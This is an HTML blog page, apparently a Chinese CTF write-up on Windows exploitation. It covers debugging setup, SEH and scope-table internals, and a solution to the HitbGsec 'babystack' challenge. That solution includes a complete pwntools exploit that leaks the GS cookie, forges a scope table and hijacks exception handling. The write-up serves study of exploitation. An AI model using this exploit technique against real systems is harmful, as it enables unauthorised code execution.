@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="windows pwn初探前言这几天跟着xxrw和lyyl学到了不少winpwn的知识，整理一下 环境搭建checksec工具： winchecksec checksec 调试工具： windbg windbg previewer win_server 调试win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。 常用命令：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="winpwn">
+<meta property="og:url" content="http://ama2in9.top/2020/12/24/winpwn/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="windows pwn初探前言这几天跟着xxrw和lyyl学到了不少winpwn的知识，整理一下 环境搭建checksec工具： winchecksec checksec 调试工具： windbg windbg previewer win_server 调试win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。 常用命令：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ama2in9.top/2020/12/24/winpwn/1.png">
+<meta property="og:updated_time" content="2020-12-24T04:11:03.365Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="winpwn">
+<meta name="twitter:description" content="windows pwn初探前言这几天跟着xxrw和lyyl学到了不少winpwn的知识，整理一下 环境搭建checksec工具： winchecksec checksec 调试工具： windbg windbg previewer win_server 调试win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。 常用命令：">
+<meta name="twitter:image" content="http://ama2in9.top/2020/12/24/winpwn/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://ama2in9.top/2020/12/24/winpwn/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>winpwn | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2020/12/24/winpwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">winpwn
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-12-24 12:10:46 / Modified: 12:11:03" itemprop="dateCreated datePublished" datetime="2020-12-24T12:10:46+08:00">2020-12-24</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/12/24/winpwn/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/12/24/winpwn/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/12/24/winpwn/" class="leancloud_visitors" data-flag-title="winpwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="windows-pwn初探"><a href="#windows-pwn初探" class="headerlink" title="windows pwn初探"></a>windows pwn初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天跟着xxrw和lyyl学到了不少winpwn的知识，整理一下</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>checksec工具：</p>
+<p><a href="https://github.com/trailofbits/winchecksec" target="_blank" rel="noopener">winchecksec</a></p>
+<p><a href="https://github.com/Wenzel/checksec.py" target="_blank" rel="noopener">checksec</a></p>
+<p>调试工具：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools" target="_blank" rel="noopener">windbg</a></p>
+<p>windbg previewer</p>
+<p><a href="https://github.com/Ex-Origin/win_server" target="_blank" rel="noopener">win_server</a></p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。</p>
+<p>常用命令：</p>
+<ol>
+<li>bp [exe_name]+offset:断在offset处</li>
+<li>bp pe_base+offset:断在offset处</li>
+<li>lm:查看加载的dll及pe地址空间</li>
+<li>u addr:查看addr处的代码</li>
+<li>g:运行到断点</li>
+<li>p:单步步过</li>
+<li>t:单步步入</li>
+<li>!address [target_addr]:查看target_addr所属的地址范围</li>
+<li>dps [addr]:查看addr处开始的一段范围内的值，并且搜索出二进制对应的符号</li>
+<li>s -d 0x0 l?0x7fffffff 0x12345678 全局搜索0x12345678<br>寻找gadget:</li>
+</ol>
+<p><code>ropper --file ./ntdll.dll --nocolor &gt; gadget</code></p>
+<p>注意因为linux/win的汇编不同不可使用ROPGadget找gadget。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol>
+<li>GS:类似canary</li>
+<li>ASLR:地址随机化，但是只有开机的时候才会随机一次</li>
+</ol>
+<h3 id="windows异常处理机制"><a href="#windows异常处理机制" class="headerlink" title="windows异常处理机制"></a>windows异常处理机制</h3><p>scopeTable结构体中保存了<strong>try块相匹配的</strong>except,__finally的值，在main函数开始的入口就被压入到栈中。</p>
+<p>在遇到异常时，先执行except_handler4函数，该函数首先将scope_table的地址同security_cookie异或得到实际地址，之后验证gs的值，满足要求后当try_level=0xfffffffe(-2)时，调用scope_table中的filter_func。</p>
+<h2 id="HitbGsec-babystack"><a href="#HitbGsec-babystack" class="headerlink" title="HitbGsec-babystack"></a>HitbGsec-babystack</h2><h3 id="程序逻辑-amp-amp-漏洞利用"><a href="#程序逻辑-amp-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>通过checksec可以看到SafeSEH关闭，ASLR开启，有GS保护。</p>
+<p>程序开始会leak出main_addr和stack_addr，根据前者可以得到pe_base，后面任意地址读可以借此得到security_cookie的值(或者先leak gs再用gs异或ebp)。</p>
+<p>程序最后有个后门，a,b被初始化为1，当a+b=3时触发后门，由于溢出不到a,b，因此后门实际触发不到，我们通过伪造scope_table来实现。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// ST38_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+20h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+24h] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+44h] [ebp-9Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+C8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  v3 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setvbuf(v3, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setvbuf(v4, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ouch! Do not kill me , I will tell you everything"</span>);</span><br><span class="line">  sub_401420(<span class="string">"stack address = 0x%x\n"</span>, &amp;v9);</span><br><span class="line">  sub_401420(<span class="string">"main address = 0x%x\n"</span>, main);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Do you want to know more?"</span>);</span><br><span class="line">    get_input((<span class="keyword">int</span>)&amp;v9, <span class="number">10</span>);</span><br><span class="line">    v7 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"yes"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      v7 = -(v7 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"no"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 = -(v6 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      get_input((<span class="keyword">int</span>)&amp;v9, <span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Where do you want to know"</span>);</span><br><span class="line">      v5 = (_DWORD *)read_int();</span><br><span class="line">      sub_401420(<span class="string">"Address 0x%x value is 0x%x\n"</span>, v5, *v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I can tell you everything, but I never believe 1+1=2"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"AAAA, you kill me just because I don't think 1+1=2??"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>观察一下函数入口处，push了try_level，其值为-2，然后push了seh_scope，<code>__except_handler4</code>异常处理指针，push了<code>fs:[0]</code>，也就是next指针，再往后push了ms_exc.exc_ptr和old_esp。</p>
+<p>ipad画了个自己能看懂的图标记了一下。可以将它想象成把一个大的结构体push到了栈上。</p>
+<p><img src="/2020/12/24/winpwn/1.png" alt="1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000000 CPPEH_RECORD    struc ; (sizeof=0x18, align=0x4, copyof_9)</span><br><span class="line">00000000                                         ; XREF: ___scrt_is_nonwritable_in_current_image/r</span><br><span class="line">00000000                                         ; _main/r ...</span><br><span class="line">00000000 old_esp         dd ?                    ; XREF: _main+36/w</span><br><span class="line">00000000                                         ; _main:final_func/r ...</span><br><span class="line">00000004 exc_ptr         dd ?                    ; XREF: __scrt_common_main_seh(void):$LN17/r</span><br><span class="line">00000004                                         ; ___scrt_is_nonwritable_in_current_image:loc_4019DE/r ; offset</span><br><span class="line">00000008 registration    _EH3_EXCEPTION_REGISTRATION ?</span><br><span class="line">00000008                                         ; XREF: _main+21/w</span><br><span class="line">00000008                                         ; _main+2D/o ...</span><br><span class="line">00000018 CPPEH_RECORD    ends</span><br><span class="line">//</span><br><span class="line">00000000 _EH3_EXCEPTION_REGISTRATION struc ; (sizeof=0x10, align=0x4, copyof_6)</span><br><span class="line">00000000                                         ; XREF: CPPEH_RECORD/r</span><br><span class="line">00000000 Next            dd ?                    ; offset</span><br><span class="line">00000004 ExceptionHandler dd ?                   ; offset</span><br><span class="line">00000008 ScopeTable      dd ?                    ; XREF: _main+21/w ; offset</span><br><span class="line">0000000C TryLevel        dd ?                    ; XREF: _main+57/w</span><br><span class="line">0000000C                                         ; _main:loc_40133F/w ...</span><br><span class="line">00000010 _EH3_EXCEPTION_REGISTRATION end</span><br></pre></td></tr></table></figure>
+<p>seh_scope的结构如下，伪造的时候前面照抄，后面将两个函数指针改成后门地址。最后触发0地址访问错误进行异常函数调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00403688 init_seh_secope_table dd 0FFFFFFE4h           ; GSCookieOffset</span><br><span class="line">.rdata:00403688                                         ; DATA XREF: _main+5↑o</span><br><span class="line">.rdata:00403688                 dd 0                    ; GSCookieXOROffset</span><br><span class="line">.rdata:00403688                 dd 0FFFFFF20h           ; EHCookieOffset</span><br><span class="line">.rdata:00403688                 dd 0                    ; EHCookieXOROffset</span><br><span class="line">.rdata:00403688                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel</span><br><span class="line">.rdata:00403688                 dd offset execpt_func   ; ScopeRecord.FilterFunc</span><br><span class="line">.rdata:00403688                 dd offset final_func    ; ScopeRecord.HandlerFunc</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xt:004010B0 ; __unwind &#123; // __except_handler4</span><br><span class="line">.text:004010B0                 push    ebp</span><br><span class="line">.text:004010B1                 mov     ebp, esp</span><br><span class="line">.text:004010B3                 push    0FFFFFFFEh</span><br><span class="line">.text:004010B5                 push    offset init_seh_secope_table</span><br><span class="line">.text:004010BA                 push    offset __except_handler4</span><br><span class="line">.text:004010BF                 mov     eax, large fs:0</span><br><span class="line">.text:004010C5                 push    eax</span><br><span class="line">.text:004010C6                 add     esp, 0FFFFFF40h</span><br><span class="line">.text:004010CC                 mov     eax, ___security_cookie</span><br><span class="line">.text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax</span><br><span class="line">.text:004010D4                 xor     eax, ebp</span><br><span class="line">.text:004010D6                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:004010D9                 push    ebx</span><br><span class="line">.text:004010DA                 push    esi</span><br><span class="line">.text:004010DB                 push    edi</span><br><span class="line">.text:004010DC                 push    eax</span><br><span class="line">.text:004010DD                 lea     eax, [ebp+ms_exc.registration]</span><br><span class="line">.text:004010E0                 mov     large fs:0, eax</span><br><span class="line">.text:004010E6                 mov     [ebp+ms_exc.old_esp], esp</span><br><span class="line">.text:004010E9                 mov     [ebp+var_B8], 0</span><br><span class="line">.text:004010F3                 mov     [ebp+var_CC], 1</span><br><span class="line">.text:004010FD                 mov     [ebp+var_D0], 1</span><br><span class="line">.text:00401107 ;   __try &#123; // __except at final_func</span><br><span class="line">.text:00401107                 mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">.text:0040110E                 push    0               ; Size</span><br><span class="line">.text:00401110                 push    4               ; Mode</span><br><span class="line">.text:00401112                 push    0               ; Buf</span><br></pre></td></tr></table></figure>
+<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.210.108.240'</span>, <span class="number">10031</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn', 28789)</span></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"><span class="comment">#leak stack addr</span></span><br><span class="line">p.recvuntil(<span class="string">"stack address = 0x"</span>)</span><br><span class="line">stack_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"stack addr =&gt; "</span> + hex(stack_addr))</span><br><span class="line"><span class="comment">#leak main addr</span></span><br><span class="line">p.recvuntil(<span class="string">"main address = 0x"</span>)</span><br><span class="line">main_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">pe_base = main_addr - <span class="number">0x10b0</span></span><br><span class="line">ebp = stack_addr+<span class="number">0x9c</span></span><br><span class="line">log.success(<span class="string">"main addr =&gt; "</span> + hex(main_addr))</span><br><span class="line"><span class="comment">#leak gs</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.sendline(str(stack_addr+<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">gs = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"gs =&gt; "</span> + hex(gs))</span><br><span class="line"></span><br><span class="line">security_cookie = gs ^ (stack_addr+<span class="number">0x9c</span>)</span><br><span class="line">log.success(<span class="string">"security_cookie =&gt; "</span> + hex(security_cookie))</span><br><span class="line"><span class="comment">#leak next</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.sendline(str(ebp<span class="number">-0x10</span>))</span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">next_p = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"next =&gt; "</span> + hex(next_p))</span><br><span class="line"><span class="comment">#fake scope</span></span><br><span class="line">back_door = pe_base + <span class="number">0x138d</span></span><br><span class="line">except_handler = pe_base + <span class="number">0x1460</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fake_scope = flat([</span></span><br><span class="line"><span class="string">    0x0FFFFFFFE,</span></span><br><span class="line"><span class="string">    0,</span></span><br><span class="line"><span class="string">    0x0FFFFFFCC,</span></span><br><span class="line"><span class="string">    0,</span></span><br><span class="line"><span class="string">    0xFFFFFFFE,</span></span><br><span class="line"><span class="string">    back_door</span></span><br><span class="line"><span class="string">    ])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">fake_scope =flat([</span><br><span class="line">    <span class="number">0x0FFFFFFE4</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFF20</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    back_door,</span><br><span class="line">    back_door</span><br><span class="line">    ])</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span>+fake_scope.ljust(<span class="number">0x9c</span><span class="number">-0x1c</span><span class="number">-0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(gs)+<span class="string">'c'</span>*<span class="number">0x8</span>+flat([</span><br><span class="line">    next_p,<span class="comment">#ebp-0x10</span></span><br><span class="line">    except_handler,</span><br><span class="line">    (stack_addr+<span class="number">0x10</span>) ^ security_cookie,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"noo"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Where do you want to know\r\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
